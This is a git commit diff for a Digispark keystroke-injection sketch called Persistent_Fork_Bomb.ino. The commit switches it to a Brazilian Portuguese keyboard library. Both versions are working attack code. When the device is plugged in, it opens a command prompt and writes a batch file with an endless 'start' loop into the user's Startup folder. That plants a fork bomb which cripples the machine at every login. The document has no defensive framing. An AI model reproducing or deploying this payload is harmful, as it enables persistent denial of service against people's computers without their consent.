674cb2057222e2d27cb5fca472a25103523011b2
CyberDenner <146398551+CyberDenner@users.noreply.github.com>
2023-11-07 14:26:19 -0300

    Persistent_Fork_Bomb.ino

--- TravarPC/Persistent_Fork_Bomb.ino
+++ TravarPC/Persistent_Fork_Bomb.ino
@@ -1,21 +1,20 @@
-#include "DigiKeyboard.h"
+#include "DigiKeyboardPtBr.h"
 
 void setup() {
 }
 
 void loop() {
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("cmd");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print(F("echo for /l %%x in (0, 0, 0) do start > \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fork.bat\""));
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("exit");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.sendKeyStroke(0);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.println("cmd");
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.print(F("echo for /l %%x in (0, 0, 0) do start > \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fork.bat\""));
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.print("exit");
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
   for(;;){ /*empty*/ }
 }
